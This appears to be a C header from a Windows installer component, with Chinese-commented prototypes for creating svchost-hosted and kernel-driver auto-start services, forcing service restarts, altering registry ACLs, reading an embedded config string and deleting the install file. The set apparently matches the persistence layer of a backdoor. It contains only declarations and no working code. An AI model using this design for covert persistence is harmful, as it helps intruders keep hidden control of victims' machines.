
#if !defined(AFX_INSTALL_H_INCLUDED)
#define AFX_INSTALL_H_INCLUDED
#include <windows.h>
#include <aclapi.h>
void	DeleteInstallFile(char *lpServiceName);
bool	IsServiceRegExists(char *lpServiceName);
void	ReConfigService(char *lpServiceName);
DWORD	QueryServiceTypeFromRegedit(char *lpServiceName);
void	RemoveService(LPCTSTR lpServiceName);
LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString);
//int		memfind(const char *mem, const char *str, int sizem, int sizes);
BOOL	RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode);

//作用:检查一个服务是否存在
//返回值:BOOL
BOOL NtServiceIsExist(LPCTSTR servicename);

//作用:启动一个已存在服务,如存在，多次重复直到其成功
//返回值:UNIT
UINT NtStartService(LPCTSTR lpService);

//作用:创建一个系统服务.SERVICE_AUTO_START
//返回值UINT
UINT NtInstallService(LPCTSTR strServiceName, //服务名称
					  LPCTSTR strDisplayName, //服务显示名称
					  LPCTSTR strDescription,//服务描述
					  LPCTSTR strPathName,   //可执行文件的路径
					  LPCTSTR Dependencies,//指定启动该服务前必须先启动的服务或服务组,一般为NULL
					  BOOLEAN KernelDriver, //是否安装驱动程序
					  ULONG   StartType		//启动类型
					  );

//作用:设置服务自动重启动
//返回值:UINT
void ServiceConfig(LPCTSTR ServiceName);

//作用:创建一个svchost启动的服务,SERVICE_AUTO_START
//返回值BOOL
BOOL NtInstallSvchostService(LPCTSTR strServiceName, 
							 LPCTSTR strServiceDisp, 
							 LPCTSTR strServiceDesc,
					       LPCTSTR strDllPath);

#endif // !defined(AFX_INSTALL_H_INCLUDED)